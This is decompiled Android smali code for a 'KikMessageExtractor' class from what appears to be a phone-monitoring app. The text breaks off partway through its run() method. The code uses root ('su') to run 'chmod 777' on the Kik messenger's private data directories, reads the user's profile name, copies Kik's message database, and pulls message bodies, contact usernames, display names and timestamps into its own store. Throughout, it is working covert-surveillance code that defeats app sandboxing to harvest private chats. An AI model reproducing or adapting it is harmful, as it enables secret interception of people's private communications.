.class public Lcom/hp/vd/module/monitor/kik/KikMessageExtractor;
.super Ljava/lang/Object;
.source "KikMessageExtractor.java"

# interfaces
.implements Ljava/lang/Runnable;


# static fields
.field protected static final TAG:Ljava/lang/String; = "KikMsgExtractor"

.field protected static final TEMP_FILE_NAME_PREFIX:Ljava/lang/String; = "kikMsgTemp"


# instance fields
.field protected context:Lcom/hp/vd/context/Context;

.field protected kikMessageDao:Lcom/j256/ormlite/dao/Dao;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Lcom/j256/ormlite/dao/Dao<",
            "Lcom/hp/vd/data/KikMessageData;",
            "Ljava/lang/Integer;",
            ">;"
        }
    .end annotation
.end field

.field protected log:Lcom/hp/vd/agent/log/IWriter;

.field protected moduleData:Lcom/hp/vd/data/ModuleData;


# direct methods
.method public constructor <init>(Lcom/hp/vd/context/Context;Lcom/j256/ormlite/dao/Dao;Lcom/hp/vd/data/ModuleData;Lcom/hp/vd/agent/log/IWriter;)V
    .locals 1
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "(",
            "Lcom/hp/vd/context/Context;",
            "Lcom/j256/ormlite/dao/Dao<",
            "Lcom/hp/vd/data/KikMessageData;",
            "Ljava/lang/Integer;",
            ">;",
            "Lcom/hp/vd/data/ModuleData;",
            "Lcom/hp/vd/agent/log/IWriter;",
            ")V"
        }
    .end annotation

    .line 48
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    const/4 v0, 0x0

    .line 42
    iput-object v0, p0, Lcom/hp/vd/module/monitor/kik/KikMessageExtractor;->context:Lcom/hp/vd/context/Context;

    .line 43
    iput-object v0, p0, Lcom/hp/vd/module/monitor/kik/KikMessageExtractor;->kikMessageDao:Lcom/j256/ormlite/dao/Dao;

    .line 44
    iput-object v0, p0, Lcom/hp/vd/module/monitor/kik/KikMessageExtractor;->moduleData:Lcom/hp/vd/data/ModuleData;

    .line 45
    iput-object v0, p0, Lcom/hp/vd/module/monitor/kik/KikMessageExtractor;->log:Lcom/hp/vd/agent/log/IWriter;

    .line 49
    iput-object p1, p0, Lcom/hp/vd/module/monitor/kik/KikMessageExtractor;->context:Lcom/hp/vd/context/Context;

    .line 50
    iput-object p2, p0, Lcom/hp/vd/module/monitor/kik/KikMessageExtractor;->kikMessageDao:Lcom/j256/ormlite/dao/Dao;

    .line 51
    iput-object p3, p0, Lcom/hp/vd/module/monitor/kik/KikMessageExtractor;->moduleData:Lcom/hp/vd/data/ModuleData;

    .line 52
    iput-object p4, p0, Lcom/hp/vd/module/monitor/kik/KikMessageExtractor;->log:Lcom/hp/vd/agent/log/IWriter;

    return-void
.end method


# virtual methods
.method protected chmod(Ljava/lang/String;Ljava/lang/Boolean;)Z
    .locals 4

    .line 353
    iget-object v0, p0, Lcom/hp/vd/module/monitor/kik/KikMessageExtractor;->context:Lcom/hp/vd/context/Context;

    invoke-virtual {v0}, Lcom/hp/vd/context/Context;->getLog()Lcom/hp/vd/agent/log/IWriter;

    move-result-object v0

    .line 356
    :try_start_0
    invoke-static {}, Ljava/lang/Runtime;->getRuntime()Ljava/lang/Runtime;

    move-result-object v1

    const-string v2, "su"

    invoke-virtual {v1, v2}, Ljava/lang/Runtime;->exec(Ljava/lang/String;)Ljava/lang/Process;

    move-result-object v1

    .line 357
    new-instance v2, Ljava/io/DataOutputStream;

    invoke-virtual {v1}, Ljava/lang/Process;->getOutputStream()Ljava/io/OutputStream;

    move-result-object v3

    invoke-direct {v2, v3}, Ljava/io/DataOutputStream;-><init>(Ljava/io/OutputStream;)V

    .line 360
    invoke-virtual {p2}, Ljava/lang/Boolean;->booleanValue()Z

    move-result p2

    if-eqz p2, :cond_0

    .line 361
    new-instance p2, Ljava/lang/StringBuilder;

    invoke-direct {p2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v3, "chmod -R 777 "

    invoke-virtual {p2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p2, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string p1, "\n"

    invoke-virtual {p2, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    invoke-virtual {v2, p1}, Ljava/io/DataOutputStream;->writeBytes(Ljava/lang/String;)V

    goto :goto_0

    .line 364
    :cond_0
    new-instance p2, Ljava/lang/StringBuilder;

    invoke-direct {p2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v3, "chmod 777 "

    invoke-virtual {p2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p2, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string p1, "\n"

    invoke-virtual {p2, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    invoke-virtual {v2, p1}, Ljava/io/DataOutputStream;->writeBytes(Ljava/lang/String;)V

    .line 367
    :goto_0
    invoke-virtual {v2}, Ljava/io/DataOutputStream;->flush()V

    const-string p1, "exit\n"

    .line 369
    invoke-virtual {v2, p1}, Ljava/io/DataOutputStream;->writeBytes(Ljava/lang/String;)V

    .line 370
    invoke-virtual {v2}, Ljava/io/DataOutputStream;->flush()V

    .line 372
    invoke-virtual {v1}, Ljava/lang/Process;->waitFor()I
    :try_end_0
    .catch Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_1
    .catch Ljava/lang/InterruptedException; {:try_start_0 .. :try_end_0} :catch_0

    const/4 p1, 0x1

    return p1

    :catch_0
    move-exception p1

    const-string p2, "KikMsgExtractor"

    const-string v1, "chmod(): InterruptedException"

    .line 380
    invoke-interface {v0, p2, v1, p1}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    goto :goto_1

    :catch_1
    move-exception p1

    const-string p2, "KikMsgExtractor"

    const-string v1, "chmod(): IOException"

    .line 377
    invoke-interface {v0, p2, v1, p1}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    :goto_1
    const/4 p1, 0x0

    return p1
.end method

.method protected cleanTempFilesFromPreviousInvocations(Ljava/lang/String;)V
    .locals 3

    .line 436
    :try_start_0
    new-instance v0, Ljava/io/File;

    iget-object v1, p0, Lcom/hp/vd/module/monitor/kik/KikMessageExtractor;->context:Lcom/hp/vd/context/Context;

    invoke-virtual {v1}, Lcom/hp/vd/context/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v1

    invoke-virtual {v1}, Landroid/content/Context;->getCacheDir()Ljava/io/File;

    move-result-object v1

    invoke-virtual {v1}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;

    move-result-object v1

    invoke-direct {v0, v1}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    .line 437
    new-instance v1, Lcom/hp/vd/module/monitor/kik/StartsWithFilenameFilter;

    invoke-direct {v1, p1}, Lcom/hp/vd/module/monitor/kik/StartsWithFilenameFilter;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0, v1}, Ljava/io/File;->listFiles(Ljava/io/FilenameFilter;)[Ljava/io/File;

    move-result-object p1

    .line 439
    array-length v0, p1

    const/4 v1, 0x0

    :goto_0
    if-ge v1, v0, :cond_0

    aget-object v2, p1, v1

    .line 440
    invoke-virtual {v2}, Ljava/io/File;->delete()Z
    :try_end_0
    .catch Ljava/lang/Throwable; {:try_start_0 .. :try_end_0} :catch_0

    add-int/lit8 v1, v1, 0x1

    goto :goto_0

    :catch_0
    move-exception p1

    .line 444
    iget-object v0, p0, Lcom/hp/vd/module/monitor/kik/KikMessageExtractor;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v1, "KikMsgExtractor"

    const-string v2, "Throwable caught while deleting temp files from previous invocation at"

    invoke-interface {v0, v1, v2, p1}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    :cond_0
    return-void
.end method

.method protected constructIdentifier(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
    .locals 1

    .line 321
    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v0, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string p1, "_"

    invoke-virtual {v0, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0, p2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    return-object p1
.end method

.method public copy(Ljava/io/File;Ljava/io/File;)V
    .locals 7
    .annotation system Ldalvik/annotation/Throws;
        value = {
            Ljava/io/IOException;
        }
    .end annotation

    .line 421
    new-instance v0, Ljava/io/FileInputStream;

    invoke-direct {v0, p1}, Ljava/io/FileInputStream;-><init>(Ljava/io/File;)V

    .line 422
    new-instance p1, Ljava/io/FileOutputStream;

    invoke-direct {p1, p2}, Ljava/io/FileOutputStream;-><init>(Ljava/io/File;)V

    .line 424
    invoke-virtual {v0}, Ljava/io/FileInputStream;->getChannel()Ljava/nio/channels/FileChannel;

    move-result-object v1

    .line 425
    invoke-virtual {p1}, Ljava/io/FileOutputStream;->getChannel()Ljava/nio/channels/FileChannel;

    move-result-object v6

    .line 427
    invoke-virtual {v1}, Ljava/nio/channels/FileChannel;->size()J

    move-result-wide v4

    const-wide/16 v2, 0x0

    invoke-virtual/range {v1 .. v6}, Ljava/nio/channels/FileChannel;->transferTo(JJLjava/nio/channels/WritableByteChannel;)J

    .line 429
    invoke-virtual {v0}, Ljava/io/FileInputStream;->close()V

    .line 430
    invoke-virtual {p1}, Ljava/io/FileOutputStream;->close()V

    return-void
.end method

.method protected detectDatabaseFiles()Ljava/util/Map;
    .locals 11
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "()",
            "Ljava/util/Map<",
            "Ljava/lang/String;",
            "Ljava/lang/String;",
            ">;"
        }
    .end annotation

    .line 220
    new-instance v0, Ljava/util/HashMap;

    invoke-direct {v0}, Ljava/util/HashMap;-><init>()V

    const-string v1, "/data/data/kik.android/shared_prefs/"

    .line 223
    invoke-virtual {p0, v1}, Lcom/hp/vd/module/monitor/kik/KikMessageExtractor;->isReadable(Ljava/lang/String;)Z

    move-result v2

    const/4 v3, 0x0

    if-nez v2, :cond_0

    .line 224
    invoke-static {v3}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v2

    invoke-virtual {p0, v1, v2}, Lcom/hp/vd/module/monitor/kik/KikMessageExtractor;->chmod(Ljava/lang/String;Ljava/lang/Boolean;)Z

    .line 228
    :cond_0
    new-instance v2, Ljava/io/File;

    invoke-direct {v2, v1}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    .line 229
    new-instance v1, Lcom/hp/vd/module/monitor/kik/LiveFilenameFilter;

    invoke-direct {v1}, Lcom/hp/vd/module/monitor/kik/LiveFilenameFilter;-><init>()V

    invoke-virtual {v2, v1}, Ljava/io/File;->listFiles(Ljava/io/FilenameFilter;)[Ljava/io/File;

    move-result-object v1

    if-eqz v1, :cond_9

    .line 235
    array-length v2, v1

    if-nez v2, :cond_1

    goto/16 :goto_2

    .line 243
    :cond_1
    array-length v2, v1

    move v4, v3

    :goto_0
    if-ge v4, v2, :cond_8

    aget-object v5, v1, v4

    .line 244
    invoke-virtual {v5}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;

    move-result-object v6

    invoke-virtual {p0, v6}, Lcom/hp/vd/module/monitor/kik/KikMessageExtractor;->isReadable(Ljava/lang/String;)Z

    move-result v6

    if-nez v6, :cond_2

    .line 245
    invoke-virtual {v5}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;

    move-result-object v6

    invoke-static {v3}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v7

    invoke-virtual {p0, v6, v7}, Lcom/hp/vd/module/monitor/kik/KikMessageExtractor;->chmod(Ljava/lang/String;Ljava/lang/Boolean;)Z

    .line 248
    :cond_2
    invoke-virtual {v5}, Ljava/io/File;->isFile()Z

    move-result v6

    if-eqz v6, :cond_7

    invoke-virtual {v5}, Ljava/io/File;->length()J

    move-result-wide v6

    const-wide/16 v8, 0x0

    cmp-long v10, v6, v8

    if-nez v10, :cond_3

    goto :goto_1

    .line 256
    :cond_3
    invoke-virtual {v5}, Ljava/io/File;->getName()Ljava/lang/String;

    move-result-object v6

    .line 257
    invoke-virtual {v6}, Ljava/lang/String;->length()I

    move-result v7

    const-string v8, ".KikPreferences.xml"

    invoke-virtual {v8}, Ljava/lang/String;->length()I

    move-result v8

    sub-int/2addr v7, v8

    invoke-virtual {v6, v3, v7}, Ljava/lang/String;->substring(II)Ljava/lang/String;

    move-result-object v6

    .line 259
    new-instance v7, Ljava/lang/StringBuilder;

    invoke-direct {v7}, Ljava/lang/StringBuilder;-><init>()V

    const-string v8, "/data/data/kik.android/databases/"

    invoke-virtual {v7, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v7, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v8, ".kikDatabase.db"

    invoke-virtual {v7, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v7}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v7

    .line 261
    invoke-virtual {p0, v7}, Lcom/hp/vd/module/monitor/kik/KikMessageExtractor;->isReadable(Ljava/lang/String;)Z

    move-result v8

    if-nez v8, :cond_4

    .line 262
    invoke-static {v3}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v8

    invoke-virtual {p0, v7, v8}, Lcom/hp/vd/module/monitor/kik/KikMessageExtractor;->chmod(Ljava/lang/String;Ljava/lang/Boolean;)Z

    .line 269
    :cond_4
    invoke-virtual {p0, v5}, Lcom/hp/vd/module/monitor/kik/KikMessageExtractor;->extractProfile(Ljava/io/File;)Ljava/lang/String;

    move-result-object v5

    if-eqz v5, :cond_5

    const-string v8, ""

    if-ne v5, v8, :cond_6

    :cond_5
    move-object v5, v6

    .line 274
    :cond_6
    invoke-interface {v0, v7, v5}, Ljava/util/Map;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    :cond_7
    :goto_1
    add-int/lit8 v4, v4, 0x1

    goto :goto_0

    :cond_8
    return-object v0

    :cond_9
    :goto_2
    return-object v0
.end method

.method protected extractMessages(Landroid/database/sqlite/SQLiteDatabase;Ljava/lang/String;)V
    .locals 7

    .line 135
    iget-object v0, p0, Lcom/hp/vd/module/monitor/kik/KikMessageExtractor;->moduleData:Lcom/hp/vd/data/ModuleData;

    const-string v1, "kik_max_id"

    .line 137
    invoke-virtual {p0, v1, p2}, Lcom/hp/vd/module/monitor/kik/KikMessageExtractor;->constructIdentifier(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    .line 135
    invoke-virtual {p0, v0, v1}, Lcom/hp/vd/module/monitor/kik/KikMessageExtractor;->safeExtractMaxId(Lcom/hp/vd/data/ModuleData;Ljava/lang/String;)Ljava/lang/Integer;

    move-result-object v0

    .line 141
    new-instance v1, Lcom/hp/vd/module/monitor/kik/Columns;

    invoke-direct {v1}, Lcom/hp/vd/module/monitor/kik/Columns;-><init>()V

    :try_start_0
    const-string v2, "SELECT m._id, m.was_me, c.is_group, c.user_name, c.display_name, m.body, m.timestamp FROM messagesTable m LEFT JOIN kikcontactsTable c ON c.jid = m.partner_jid WHERE m.body != \"\" AND m._id > ? ORDER BY m._id ASC LIMIT ?"

    const/4 v3, 0x2

    .line 146
    new-array v3, v3, [Ljava/lang/String;

    const/4 v4, 0x0

    .line 149
    invoke-virtual {v0}, Ljava/lang/Integer;->toString()Ljava/lang/String;

    move-result-object v5

    aput-object v5, v3, v4

    const/4 v4, 0x1

    const-string v5, "500"

    aput-object v5, v3, v4

    .line 146
    invoke-virtual {p1, v2, v3}, Landroid/database/sqlite/SQLiteDatabase;->rawQuery(Ljava/lang/String;[Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object p1

    if-nez p1, :cond_0

    .line 155
    iget-object p1, p0, Lcom/hp/vd/module/monitor/kik/KikMessageExtractor;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string p2, "KikMsgExtractor"

    const-string v0, "Message Cursor is null."

    const/4 v1, 0x3

    invoke-interface {p1, p2, v0, v1}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;I)Z

    return-void

    :cond_0
    if-eqz p1, :cond_1

    move-object v2, v0

    .line 161
    :goto_0
    invoke-interface {p1}, Landroid/database/Cursor;->moveToNext()Z

    move-result v3

    if-eqz v3, :cond_2

    .line 162
    new-instance v2, Lcom/hp/vd/data/KikMessageData;

    invoke-direct {v2}, Lcom/hp/vd/data/KikMessageData;-><init>()V

    .line 164
    iput-object p2, v2, Lcom/hp/vd/data/KikMessageData;->profile:Ljava/lang/String;

    .line 165
    invoke-virtual {v1}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    const-string v3, "_id"

    invoke-interface {p1, v3}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v3

    invoke-interface {p1, v3}, Landroid/database/Cursor;->getInt(I)I

    move-result v3

    invoke-static {v3}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v3

    iput-object v3, v2, Lcom/hp/vd/data/KikMessageData;->internalId:Ljava/lang/Integer;

    .line 167
    invoke-virtual {v1}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    const-string v3, "timestamp"

    invoke-interface {p1, v3}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v3

    invoke-interface {p1, v3}, Landroid/database/Cursor;->getLong(I)J

    move-result-wide v3

    invoke-static {v3, v4}, Ljava/lang/Long;->valueOf(J)Ljava/lang/Long;

    move-result-object v3

    .line 168
    new-instance v4, Ljava/util/Date;

    invoke-virtual {v3}, Ljava/lang/Long;->longValue()J

    move-result-wide v5

    invoke-direct {v4, v5, v6}, Ljava/util/Date;-><init>(J)V

    iput-object v4, v2, Lcom/hp/vd/data/KikMessageData;->createdAt:Ljava/util/Date;

    .line 170
    invoke-virtual {v1}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    const-string v3, "was_me"

    invoke-interface {p1, v3}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v3

    invoke-interface {p1, v3}, Landroid/database/Cursor;->getInt(I)I

    move-result v3

    invoke-static {v3}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v3

    iput-object v3, v2, Lcom/hp/vd/data/KikMessageData;->wasMe:Ljava/lang/Integer;

    .line 171
    invoke-virtual {v1}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    const-string v3, "is_group"

    invoke-interface {p1, v3}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v3

    invoke-interface {p1, v3}, Landroid/database/Cursor;->getInt(I)I

    move-result v3

    invoke-static {v3}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v3

    iput-object v3, v2, Lcom/hp/vd/data/KikMessageData;->isGroup:Ljava/lang/Integer;

    .line 173
    invoke-virtual {v1}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    const-string v3, "user_name"

    invoke-interface {p1, v3}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v3

    invoke-interface {p1, v3}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v3

    iput-object v3, v2, Lcom/hp/vd/data/KikMessageData;->username:Ljava/lang/String;

    .line 174
    invoke-virtual {v1}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    const-string v3, "display_name"

    invoke-interface {p1, v3}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v3

    invoke-interface {p1, v3}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v3

    iput-object v3, v2, Lcom/hp/vd/data/KikMessageData;->displayName:Ljava/lang/String;

    .line 175
    invoke-virtual {v1}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    const-string v3, "body"

    invoke-interface {p1, v3}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v3

    invoke-interface {p1, v3}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v3

    iput-object v3, v2, Lcom/hp/vd/data/KikMessageData;->body:Ljava/lang/String;

    .line 181
    iget-object v3, p0, Lcom/hp/vd/module/monitor/kik/KikMessageExtractor;->kikMessageDao:Lcom/j256/ormlite/dao/Dao;

    invoke-interface {v3, v2}, Lcom/j256/ormlite/dao/Dao;->create(Ljava/lang/Object;)I

    .line 183
    iget-object v2, v2, Lcom/hp/vd/data/KikMessageData;->internalId:Ljava/lang/Integer;

    goto/16 :goto_0

    :cond_1
    move-object v2, v0

    .line 187
    :cond_2
    invoke-interface {p1}, Landroid/database/Cursor;->close()V

    if-eq v0, v2, :cond_3

    .line 194
    iget-object p1, p0, Lcom/hp/vd/module/monitor/kik/KikMessageExtractor;->moduleData:Lcom/hp/vd/data/ModuleData;

    const-string v0, "kik_max_id"

    .line 195
    invoke-virtual {p0, v0, p2}, Lcom/hp/vd/module/monitor/kik/KikMessageExtractor;->constructIdentifier(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object p2

    .line 194
    invoke-virtual {p1, p2, v2}, Lcom/hp/vd/data/ModuleData;->customSet(Ljava/lang/String;Ljava/lang/Integer;)V

    .line 199
    iget-object p1, p0, Lcom/hp/vd/module/monitor/kik/KikMessageExtractor;->context:Lcom/hp/vd/context/Context;

    invoke-virtual {p1}, Lcom/hp/vd/context/Context;->getHelper()Lcom/hp/vd/data/persistency/DatabaseHelper;

    move-result-object p1

    invoke-virtual {p1}, Lcom/hp/vd/data/persistency/DatabaseHelper;->getModuleDao()Lcom/j256/ormlite/dao/Dao;

    move-result-object p1

    .line 200
    iget-object p2, p0, Lcom/hp/vd/module/monitor/kik/KikMessageExtractor;->moduleData:Lcom/hp/vd/data/ModuleData;

    invoke-interface {p1, p2}, Lcom/j256/ormlite/dao/Dao;->update(Ljava/lang/Object;)I
    :try_end_0
    .catch Ljava/lang/Throwable; {:try_start_0 .. :try_end_0} :catch_0

    :cond_3
    return-void

    :catch_0
    move-exception p1

    .line 203
    iget-object p2, p0, Lcom/hp/vd/module/monitor/kik/KikMessageExtractor;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v0, "KikMsgExtractor"

    const-string v1, "Error extracting data."

    invoke-interface {p2, v0, v1, p1}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    return-void
.end method

.method protected extractProfile(Ljava/io/File;)Ljava/lang/String;
    .locals 4

    const-string v0, "//string[@name=\"user_profile_username\"]"

    const/4 v1, 0x0

    .line 288
    :try_start_0
    invoke-static {}, Ljavax/xml/parsers/DocumentBuilderFactory;->newInstance()Ljavax/xml/parsers/DocumentBuilderFactory;

    move-result-object v2

    .line 289
    invoke-virtual {v2}, Ljavax/xml/parsers/DocumentBuilderFactory;->newDocumentBuilder()Ljavax/xml/parsers/DocumentBuilder;

    move-result-object v2

    .line 291
    invoke-virtual {v2, p1}, Ljavax/xml/parsers/DocumentBuilder;->parse(Ljava/io/File;)Lorg/w3c/dom/Document;

    move-result-object p1
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_1

    if-nez p1, :cond_0

    .line 300
    iget-object p1, p0, Lcom/hp/vd/module/monitor/kik/KikMessageExtractor;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v0, "KikMsgExtractor"

    const-string v2, "document should not be null while extracting profile"

    const/4 v3, 0x3

    invoke-interface {p1, v0, v2, v3}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;I)Z

    return-object v1

    .line 305
    :cond_0
    invoke-static {}, Ljavax/xml/xpath/XPathFactory;->newInstance()Ljavax/xml/xpath/XPathFactory;

    move-result-object v2

    invoke-virtual {v2}, Ljavax/xml/xpath/XPathFactory;->newXPath()Ljavax/xml/xpath/XPath;

    move-result-object v2

    .line 308
    :try_start_1
    invoke-interface {v2, v0}, Ljavax/xml/xpath/XPath;->compile(Ljava/lang/String;)Ljavax/xml/xpath/XPathExpression;

    move-result-object v0

    invoke-interface {v0, p1}, Ljavax/xml/xpath/XPathExpression;->evaluate(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object p1
    :try_end_1
    .catch Ljavax/xml/xpath/XPathExpressionException; {:try_start_1 .. :try_end_1} :catch_0

    return-object p1

    :catch_0
    move-exception p1

    .line 311
    iget-object v0, p0, Lcom/hp/vd/module/monitor/kik/KikMessageExtractor;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v2, "KikMsgExtractor"

    const-string v3, "XPathExpressionException caught while searching for username"

    invoke-interface {v0, v2, v3, p1}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    return-object v1

    :catch_1
    move-exception p1

    .line 294
    iget-object v0, p0, Lcom/hp/vd/module/monitor/kik/KikMessageExtractor;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v2, "KikMsgExtractor"

    const-string v3, "Exception caught while extracting profile"

    invoke-interface {v0, v2, v3, p1}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    return-object v1
.end method

.method public isReadable(Ljava/lang/String;)Z
    .locals 1

    .line 346
    new-instance v0, Ljava/io/File;

    invoke-direct {v0, p1}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    .line 348
    invoke-virtual {v0}, Ljava/io/File;->canRead()Z

    move-result p1

    return p1
.end method

.method protected prepareDatabase(Ljava/io/File;Ljava/io/File;)Landroid/database/sqlite/SQLiteDatabase;
    .locals 4

    const/4 v0, 0x0

    .line 393
    :try_start_0
    invoke-virtual {p0, p1, p2}, Lcom/hp/vd/module/monitor/kik/KikMessageExtractor;->copy(Ljava/io/File;Ljava/io/File;)V
    :try_end_0
    .catch Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_1

    .line 407
    :try_start_1
    invoke-virtual {p2}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;

    move-result-object p1

    const/16 v1, 0x10

    invoke-static {p1, v0, v1}, Landroid/database/sqlite/SQLiteDatabase;->openDatabase(Ljava/lang/String;Landroid/database/sqlite/SQLiteDatabase$CursorFactory;I)Landroid/database/sqlite/SQLiteDatabase;

    move-result-object p1
    :try_end_1
    .catch Landroid/database/sqlite/SQLiteException; {:try_start_1 .. :try_end_1} :catch_0

    return-object p1

    :catch_0
    move-exception p1

    .line 410
    iget-object v1, p0, Lcom/hp/vd/module/monitor/kik/KikMessageExtractor;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v2, "KikMsgExtractor"

    const-string v3, "Exception caught while opening database."

    invoke-interface {v1, v2, v3, p1}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    .line 411
    invoke-virtual {p2}, Ljava/io/File;->delete()Z

    return-object v0

    :catch_1
    move-exception p1

    .line 395
    iget-object p2, p0, Lcom/hp/vd/module/monitor/kik/KikMessageExtractor;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v1, "KikMsgExtractor"

    const-string v2, "prepareDatabase(): Exception caught during coping database to a temporary location."

    invoke-interface {p2, v1, v2, p1}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    return-object v0
.end method

.method public run()V
    .locals 8

    const-string v0, "kikMsgTemp"

    .line 62
    invoke-virtual {p0, v0}, Lcom/hp/vd/module/monitor/kik/KikMessageExtractor;->cleanTempFilesFromPreviousInvocations(Ljava/lang/String;)V

    .line 67
    invoke-virtual {p0}, Lcom/hp/vd/module/monitor/kik/KikMessageExtractor;->detectDatabaseFiles()Ljava/util/Map;

    move-result-object v0

    .line 69
    invoke-interface {v0}, Ljava/util/Map;->isEmpty()Z

    move-result v1

    if-eqz v1, :cond_0

    .line 70
    iget-object v0, p0, Lcom/hp/vd/module/monitor/kik/KikMessageExtractor;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v1, "KikMsgExtractor"

    const-string v2, "No databases detected."

    invoke-interface {v0, v1, v2}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;)Z

    return-void

    .line 75
    :cond_0
    invoke-interface {v0}, Ljava/util/Map;->entrySet()Ljava/util/Set;

    move-result-object v0

    invoke-interface {v0}, Ljava/util/Set;->iterator()Ljava/util/Iterator;

    move-result-object v0

    :cond_1
    :goto_0
    invoke-interface {v0}, Ljava/util/Iterator;->hasNext()Z

    move-result v1

    if-eqz v1, :cond_3

    invoke-interface {v0}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v1

    check-cast v1, Ljava/util/Map$Entry;

    .line 77
